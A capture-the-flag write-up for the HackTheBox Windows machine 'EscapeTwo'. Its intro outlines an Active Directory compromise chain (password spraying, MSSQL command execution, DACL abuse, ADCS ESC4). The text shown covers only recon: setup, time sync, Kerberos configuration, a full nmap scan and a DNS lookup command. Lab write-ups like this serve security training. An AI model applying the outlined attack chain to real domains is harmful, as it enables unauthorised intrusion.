---
render_with_liquid: false
title: HackTheBox Writeup - EscapeTwo
date: 2025-01-17 04:04:51 +1400
tags: [hackthebox, nmap, windows, ad, assumed-breach, smb, netexec, mssql, impacket, mssqlclient, ldeep, bloodhound, bloodhound-python, bloodhound-quickwin, discover-secrets, xlsx, credentials-exposure, password-spraying, xp-cmdshell, reverse-ssh, evil-winrm, ad-dacl, owneredit, dacledit, adcs, certipy, adcs-esc4, pass-the-cert, oscp-like-2023]
image:
    path: https://labs.hackthebox.com/storage/avatars/d5fcf2425893a73cf137284e2de580e1.png
    width: 640
    height: 480
---



`EscapeTwo` is an easy difficulty Windows machine designed around a complete domain compromise scenario, where credentials for a low-privileged user are provided. We leverage these credentials to access a file share containing a corrupted Excel document. By modifying its byte structure, we extract credentials. These are then sprayed across the domain, revealing valid credentials for a user with access to `MSSQL`, granting us initial access. System enumeration reveals `SQL` credentials, which are sprayed to obtain `WinRM` access. Further domain analysis shows the user has write owner rights over an account managing `ADCS`. This is used to enumerate `ADCS`, revealing a misconfiguration in `Active Directory Certificate Services`. Exploiting this misconfiguration allows us to retrieve the `Administrator` account hash, ultimately leading to complete domain compromise.

# Recon
---

## Setup

```bash
┌──(bravosec㉿fsociety)-[~/htb/EscapeTwo]
└─$ pt init '10.10.11.51 sequel.htb DC01.sequel.htb DC01'
+-----------+--------+-------------+-----------------+
|  PROFILE  | STATUS |     IP      |     DOMAIN      |
+-----------+--------+-------------+-----------------+
| escapetwo | on     | 10.10.11.51 | sequel.htb      |
| escapetwo | on     | 10.10.11.51 | DC01.sequel.htb |
| escapetwo | on     | 10.10.11.51 | DC01            |
+-----------+--------+-------------+-----------------+

┌──(bravosec㉿fsociety)-[~/htb/EscapeTwo]
└─$ pt set dc_name "$(cat .pt/hosts | head -n1 | awk '{print $NF}')"; pt set dc_fqdn "$(pt get dc_name).$(pt get domain)"
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/EscapeTwo]
└─$ ~/scripts/ad/sync_ntp.sh $(pt get ip)
[*] Disable virtualbox's auto time sync
-> sudo /etc/init.d/virtualbox-guest-utils stop
Stopping virtualbox-guest-utils (via systemctl): virtualbox-guest-utils.service.

[*] Stop systemd-timesyncd to sync Time manually
-> sudo systemctl stop systemd-timesyncd

[*] Disable system time sync
-> sudo systemctl disable --now chronyd
Failed to disable unit: Unit chronyd.service does not exist

[*] Sync time with NTP server
-> sudo ntpdate -u $1
2025-01-17 16:18:57.975703 (+0800) +0.017896 +/- 0.105822 10.10.11.51 s1 no-leap

Done syncing time with NTP server: 10.10.11.51
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/EscapeTwo]
└─$ sudo ~/scripts/ad/configure_krb5.py $(pt get domain) $(pt get dc_name)
[*] Configuration Data:
[libdefault]
        default_realm = SEQUEL.HTB

[realms]
        SEQUEL.HTB = {
                kdc = dc01.sequel.htb
                admin_server = dc01.sequel.htb
        }

[domain_realm]
        sequel.htb = SEQUEL.HTB
        .sequel.htb = SEQUEL.HTB

[*] Previous config backed up to /etc/krb5.conf~
[+] /etc/krb5.conf has been configured
```

## Nmap

```bash

# Nmap 7.94SVN scan initiated Fri Jan 17 04:04:51 2025 as: /usr/lib/nmap/nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,47001,49664,49665,49666,49667,49685,49686,49687,49702,49718,49727, sequel.htb
Nmap scan report for sequel.htb (10.10.11.51)
Host is up, received user-set (0.18s latency).
Scanned at 2025-01-17 04:04:51 CST for 134s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-01-16 19:50:09Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-01-16T19:52:14+00:00; -14m49s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-08T17:35:00
| Not valid after:  2025-06-08T17:35:00
| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff
| SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5
| -----BEGIN CERTIFICATE-----
| MIIGJjCCBQ6gAwIBAgITVAAAAANDveocXlnSDQAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
| MRcwFQYDVQQDEw5zZXF1ZWwtREMwMS1DQTAeFw0yNDA2MDgxNzM1MDBaFw0yNTA2
| MDgxNzM1MDBaMBoxGDAWBgNVBAMTD0RDMDEuc2VxdWVsLmh0YjCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBANRCnm8pZ86LZP3kAtl29rFgY5gEOEXSCZSm
| F6Ai+1vh6a8LrCRKMWtC8+Kla0PXgjTcGcmDawcI8h0BsaSH6sQVAD21ca5MQcv0
| xf+4TzrvAnp9H+pVHO1r42cLXBwq14Ak8dSueiOLgxoLKO1CDtKk+e8ZxQWf94Bp
| Vu8rnpImFT6IeDgACeBfb0hLzK2JJRT9ezZiUVxoTfMKKuy4IPFWcshW/1bQfEK0
| ExOcQZVaoCJzRPBUVTp/XGHEW9d6abW8h1UR+64qVfGexsrUKBfxKRsHuHTxa4ts
| +qUVJRbJkzlSgyKGMjhNfT3BPVwwP8HvErWvbsWKKPRkvMaPhU0CAwEAAaOCAzcw
| ggMzMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABs
| AGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQD
| AgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQME
| AgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglg
| hkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFNfVXsrpSahW
| xfdL4wxFDgtUztvRMB8GA1UdIwQYMBaAFMZBubbkDkfWBlps8YrGlP0a+7jDMIHI
| BgNVHR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPXNlcXVlbC1EQzAxLUNB
| LENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jZXJ0aWZp
| Y2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0
| aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6
| Ly8vQ049c2VxdWVsLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERD
| PWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlv
| bkF1dGhvcml0eTA7BgNVHREENDAyoB8GCSsGAQQBgjcZAaASBBDjAT1NPPfwT4sa
| sNjnBqS3gg9EQzAxLnNlcXVlbC5odGIwTQYJKwYBBAGCNxkCBEAwPqA8BgorBgEE
| AYI3GQIBoC4ELFMtMS01LTIxLTU0ODY3MDM5Ny05NzI2ODc0ODQtMzQ5NjMzNTM3
| MC0xMDAwMA0GCSqGSIb3DQEBCwUAA4IBAQCBDjlZZbFac6RlhZ2BhLzvWmA1Xcyn
| jZmYF3aOXmmof1yyO/kxk81fStsu3gtZ94KmpkBwmd1QkSJCuT54fTxg17xDtA49
| QF7O4DPsFkeOM2ip8TAf8x5bGwH5tlZvNjllBCgSpCupZlNY8wKYnyKQDNwtWtgL
| UF4SbE9Q6JWA+Re5lPa6AoUr/sRzKxcPsAjK8kgquUA0spoDrxAqkADIRsHgBLGY
| +Wn+DXHctZtv8GcOwrfW5KkbkVykx8DSS2qH4y2+xbC3ZHjsKlVjoddkjEkrHku0
| 2iXZSIqShMXzXmLTW/G+LzqK3U3VTcKo0yUKqmLlKyZXzQ+kYVLqgOOX
|_-----END CERTIFICATE-----
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-01-16T19:52:14+00:00; -14m48s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-08T17:35:00
| Not valid after:  2025-06-08T17:35:00
| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff
| SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5
| -----BEGIN CERTIFICATE-----
| MIIGJjCCBQ6gAwIBAgITVAAAAANDveocXlnSDQAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
| MRcwFQYDVQQDEw5zZXF1ZWwtREMwMS1DQTAeFw0yNDA2MDgxNzM1MDBaFw0yNTA2
| MDgxNzM1MDBaMBoxGDAWBgNVBAMTD0RDMDEuc2VxdWVsLmh0YjCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBANRCnm8pZ86LZP3kAtl29rFgY5gEOEXSCZSm
| F6Ai+1vh6a8LrCRKMWtC8+Kla0PXgjTcGcmDawcI8h0BsaSH6sQVAD21ca5MQcv0
| xf+4TzrvAnp9H+pVHO1r42cLXBwq14Ak8dSueiOLgxoLKO1CDtKk+e8ZxQWf94Bp
| Vu8rnpImFT6IeDgACeBfb0hLzK2JJRT9ezZiUVxoTfMKKuy4IPFWcshW/1bQfEK0
| ExOcQZVaoCJzRPBUVTp/XGHEW9d6abW8h1UR+64qVfGexsrUKBfxKRsHuHTxa4ts
| +qUVJRbJkzlSgyKGMjhNfT3BPVwwP8HvErWvbsWKKPRkvMaPhU0CAwEAAaOCAzcw
| ggMzMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABs
| AGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQD
| AgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQME
| AgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglg
| hkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFNfVXsrpSahW
| xfdL4wxFDgtUztvRMB8GA1UdIwQYMBaAFMZBubbkDkfWBlps8YrGlP0a+7jDMIHI
| BgNVHR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPXNlcXVlbC1EQzAxLUNB
| LENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jZXJ0aWZp
| Y2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0
| aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6
| Ly8vQ049c2VxdWVsLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERD
| PWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlv
| bkF1dGhvcml0eTA7BgNVHREENDAyoB8GCSsGAQQBgjcZAaASBBDjAT1NPPfwT4sa
| sNjnBqS3gg9EQzAxLnNlcXVlbC5odGIwTQYJKwYBBAGCNxkCBEAwPqA8BgorBgEE
| AYI3GQIBoC4ELFMtMS01LTIxLTU0ODY3MDM5Ny05NzI2ODc0ODQtMzQ5NjMzNTM3
| MC0xMDAwMA0GCSqGSIb3DQEBCwUAA4IBAQCBDjlZZbFac6RlhZ2BhLzvWmA1Xcyn
| jZmYF3aOXmmof1yyO/kxk81fStsu3gtZ94KmpkBwmd1QkSJCuT54fTxg17xDtA49
| QF7O4DPsFkeOM2ip8TAf8x5bGwH5tlZvNjllBCgSpCupZlNY8wKYnyKQDNwtWtgL
| UF4SbE9Q6JWA+Re5lPa6AoUr/sRzKxcPsAjK8kgquUA0spoDrxAqkADIRsHgBLGY
| +Wn+DXHctZtv8GcOwrfW5KkbkVykx8DSS2qH4y2+xbC3ZHjsKlVjoddkjEkrHku0
| 2iXZSIqShMXzXmLTW/G+LzqK3U3VTcKo0yUKqmLlKyZXzQ+kYVLqgOOX
|_-----END CERTIFICATE-----
1433/tcp  open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.10.11.51:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2025-01-16T19:52:14+00:00; -14m49s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-01-16T19:46:26
| Not valid after:  2055-01-16T19:46:26
| MD5:   b7b8:898d:495f:4225:feb6:de5c:5288:e815
| SHA-1: 92d6:7379:1a8e:5605:d7d6:afa2:e2a2:d3ed:c721:1f04
| -----BEGIN CERTIFICATE-----
| MIIDADCCAeigAwIBAgIQUefrqjBzsplFaA6GxP2AejANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjUwMTE2MTk0NjI2WhgPMjA1NTAxMTYxOTQ2MjZaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBANMyHxGw
| Z47EHHLHdpkkLQIX0udMlWUEwRm0qVmjX/FF7mxxcMFEwdfXrbny/cuWrr+qv2/s
| 0mLK9nG23ttwyeBbXt+q0LN1Wk5FvKcjidYtXzgfkNZP/RhBJBa9maqwALDEQTNk
| BaCFlpMjfzGblIMZKBMRLtJHpOYFd+Dggpr6t6gt4YnWMI2H3vSNOhvHrp1Bf4f4
| oMyEOoa85Tomr9z/oUiUf1T4pjEnWFN1SyCsaWLsITI954RwcUeiGxLbIwGE3ziD
| ZoARQr87jcm46RH47kHM/p2Tq+qjAWabejaiGyj8Aopn7GH/6t5owSmMbpmg+o+Y
| uJI4XosbaNDXF/0CAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAOzKpGsn6UZXMOzyA
| woMjQBQeMsY4ROhFm+b2l5+9YbEgZyjPEtUYIA26ZxZ9zx6IofSo8CZGOzV6QBkC
| zvqE+6WiGRTeZx+h50RoZJWqUdobAefo9muPnNF+a7HUg5kruXTDmLRRdpZPNm3E
| 8+Fx/pD3yZKTrHr0Fg+ZQyiR8uwe/SAdlFDmNfGKOM7ZkOrFL9JzrXRMg9nbTCQ6
| D3wUFNUxlTKo7VgDmn5+vmkvfrhRyfJ7mlOP361eA3ifTak5YjH2NwMFrIhr+9cc
| MX5pN3BSZVwN5Sc7S8SaFJ6Q/xgP5bOxsm1b1yFULlR3NF2fMppl3Dswsuq9zCug
| yTXJcQ==
|_-----END CERTIFICATE-----
| ms-sql-ntlm-info: 
|   10.10.11.51:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-08T17:35:00
| Not valid after:  2025-06-08T17:35:00
| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff
| SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5
| -----BEGIN CERTIFICATE-----
| MIIGJjCCBQ6gAwIBAgITVAAAAANDveocXlnSDQAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
| MRcwFQYDVQQDEw5zZXF1ZWwtREMwMS1DQTAeFw0yNDA2MDgxNzM1MDBaFw0yNTA2
| MDgxNzM1MDBaMBoxGDAWBgNVBAMTD0RDMDEuc2VxdWVsLmh0YjCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBANRCnm8pZ86LZP3kAtl29rFgY5gEOEXSCZSm
| F6Ai+1vh6a8LrCRKMWtC8+Kla0PXgjTcGcmDawcI8h0BsaSH6sQVAD21ca5MQcv0
| xf+4TzrvAnp9H+pVHO1r42cLXBwq14Ak8dSueiOLgxoLKO1CDtKk+e8ZxQWf94Bp
| Vu8rnpImFT6IeDgACeBfb0hLzK2JJRT9ezZiUVxoTfMKKuy4IPFWcshW/1bQfEK0
| ExOcQZVaoCJzRPBUVTp/XGHEW9d6abW8h1UR+64qVfGexsrUKBfxKRsHuHTxa4ts
| +qUVJRbJkzlSgyKGMjhNfT3BPVwwP8HvErWvbsWKKPRkvMaPhU0CAwEAAaOCAzcw
| ggMzMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABs
| AGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQD
| AgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQME
| AgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglg
| hkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFNfVXsrpSahW
| xfdL4wxFDgtUztvRMB8GA1UdIwQYMBaAFMZBubbkDkfWBlps8YrGlP0a+7jDMIHI
| BgNVHR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPXNlcXVlbC1EQzAxLUNB
| LENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jZXJ0aWZp
| Y2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0
| aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6
| Ly8vQ049c2VxdWVsLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERD
| PWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlv
| bkF1dGhvcml0eTA7BgNVHREENDAyoB8GCSsGAQQBgjcZAaASBBDjAT1NPPfwT4sa
| sNjnBqS3gg9EQzAxLnNlcXVlbC5odGIwTQYJKwYBBAGCNxkCBEAwPqA8BgorBgEE
| AYI3GQIBoC4ELFMtMS01LTIxLTU0ODY3MDM5Ny05NzI2ODc0ODQtMzQ5NjMzNTM3
| MC0xMDAwMA0GCSqGSIb3DQEBCwUAA4IBAQCBDjlZZbFac6RlhZ2BhLzvWmA1Xcyn
| jZmYF3aOXmmof1yyO/kxk81fStsu3gtZ94KmpkBwmd1QkSJCuT54fTxg17xDtA49
| QF7O4DPsFkeOM2ip8TAf8x5bGwH5tlZvNjllBCgSpCupZlNY8wKYnyKQDNwtWtgL
| UF4SbE9Q6JWA+Re5lPa6AoUr/sRzKxcPsAjK8kgquUA0spoDrxAqkADIRsHgBLGY
| +Wn+DXHctZtv8GcOwrfW5KkbkVykx8DSS2qH4y2+xbC3ZHjsKlVjoddkjEkrHku0
| 2iXZSIqShMXzXmLTW/G+LzqK3U3VTcKo0yUKqmLlKyZXzQ+kYVLqgOOX
|_-----END CERTIFICATE-----
|_ssl-date: 2025-01-16T19:52:14+00:00; -14m49s from scanner time.
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-08T17:35:00
| Not valid after:  2025-06-08T17:35:00
| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff
| SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5
| -----BEGIN CERTIFICATE-----
| MIIGJjCCBQ6gAwIBAgITVAAAAANDveocXlnSDQAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
| MRcwFQYDVQQDEw5zZXF1ZWwtREMwMS1DQTAeFw0yNDA2MDgxNzM1MDBaFw0yNTA2
| MDgxNzM1MDBaMBoxGDAWBgNVBAMTD0RDMDEuc2VxdWVsLmh0YjCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBANRCnm8pZ86LZP3kAtl29rFgY5gEOEXSCZSm
| F6Ai+1vh6a8LrCRKMWtC8+Kla0PXgjTcGcmDawcI8h0BsaSH6sQVAD21ca5MQcv0
| xf+4TzrvAnp9H+pVHO1r42cLXBwq14Ak8dSueiOLgxoLKO1CDtKk+e8ZxQWf94Bp
| Vu8rnpImFT6IeDgACeBfb0hLzK2JJRT9ezZiUVxoTfMKKuy4IPFWcshW/1bQfEK0
| ExOcQZVaoCJzRPBUVTp/XGHEW9d6abW8h1UR+64qVfGexsrUKBfxKRsHuHTxa4ts
| +qUVJRbJkzlSgyKGMjhNfT3BPVwwP8HvErWvbsWKKPRkvMaPhU0CAwEAAaOCAzcw
| ggMzMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABs
| AGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQD
| AgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQME
| AgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglg
| hkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFNfVXsrpSahW
| xfdL4wxFDgtUztvRMB8GA1UdIwQYMBaAFMZBubbkDkfWBlps8YrGlP0a+7jDMIHI
| BgNVHR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPXNlcXVlbC1EQzAxLUNB
| LENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jZXJ0aWZp
| Y2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0
| aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6
| Ly8vQ049c2VxdWVsLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERD
| PWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlv
| bkF1dGhvcml0eTA7BgNVHREENDAyoB8GCSsGAQQBgjcZAaASBBDjAT1NPPfwT4sa
| sNjnBqS3gg9EQzAxLnNlcXVlbC5odGIwTQYJKwYBBAGCNxkCBEAwPqA8BgorBgEE
| AYI3GQIBoC4ELFMtMS01LTIxLTU0ODY3MDM5Ny05NzI2ODc0ODQtMzQ5NjMzNTM3
| MC0xMDAwMA0GCSqGSIb3DQEBCwUAA4IBAQCBDjlZZbFac6RlhZ2BhLzvWmA1Xcyn
| jZmYF3aOXmmof1yyO/kxk81fStsu3gtZ94KmpkBwmd1QkSJCuT54fTxg17xDtA49
| QF7O4DPsFkeOM2ip8TAf8x5bGwH5tlZvNjllBCgSpCupZlNY8wKYnyKQDNwtWtgL
| UF4SbE9Q6JWA+Re5lPa6AoUr/sRzKxcPsAjK8kgquUA0spoDrxAqkADIRsHgBLGY
| +Wn+DXHctZtv8GcOwrfW5KkbkVykx8DSS2qH4y2+xbC3ZHjsKlVjoddkjEkrHku0
| 2iXZSIqShMXzXmLTW/G+LzqK3U3VTcKo0yUKqmLlKyZXzQ+kYVLqgOOX
|_-----END CERTIFICATE-----
|_ssl-date: 2025-01-16T19:52:14+00:00; -14m48s from scanner time.
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49685/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49687/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49702/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49718/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49727/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 62012/tcp): CLEAN (Timeout)
|   Check 2 (port 54223/tcp): CLEAN (Timeout)
|   Check 3 (port 20179/udp): CLEAN (Timeout)
|   Check 4 (port 49465/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: -14m48s, deviation: 0s, median: -14m49s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-01-16T19:51:36
|_  start_date: N/A

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Fri Jan 17 04:07:05 2025 -- 1 IP address (1 host up) scanned in 134.55 seconds
```


## 53 - DNS

### DNS Reverse Lookup

```bash
┌──(bravosec㉿fsociety)-[~/htb/EscapeTwo]
└─$ dig -p 53 -x $(pt get rhost) @$(pt get rhost)
